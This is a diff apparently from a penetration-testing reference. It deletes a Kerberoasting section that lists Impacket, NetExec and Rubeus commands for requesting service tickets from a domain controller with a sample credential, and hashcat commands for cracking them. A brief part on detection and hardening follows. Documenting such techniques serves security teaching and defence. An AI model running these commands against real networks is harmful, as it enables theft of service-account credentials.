@@ -31,24 +31,3 @@ sequenceDiagram
 
 ### Exhaustive commands
 ```bash
-# ── Impacket ─────────────────────────────────────────────────────────
-impacket-GetUserSPNs -request -dc-ip 10.10.10.5 \
-  corp.local/lowpriv:'Password123!' -outputfile krb.txt
-impacket-GetUserSPNs -request -dc-ip 10.10.10.5 \
-  corp.local/lowpriv:'Password123!' -request-user svc_sql
-
-# ── NetExec ──────────────────────────────────────────────────────────
-nxc ldap 10.10.10.5 -u lowpriv -p 'Password123!' --kerberoasting krb.txt
-
-# ── Rubeus ───────────────────────────────────────────────────────────
-Rubeus.exe kerberoast /outfile:krb.txt
-
-# ── Crack ────────────────────────────────────────────────────────────
-hashcat -m 13100 krb.txt rockyou.txt   # RC4
-hashcat -m 19700 krb.txt rockyou.txt   # AES
-```
-
-### Detection and defensive measures
-**4769 with `TicketEncryptionType=0x17`** for service accounts, **bursts from one user across many SPNs**. Move to **AES-only** (`msDS-SupportedEncryptionTypes`), use **gMSA**, and deploy a **honeypot SPN**.
-
----
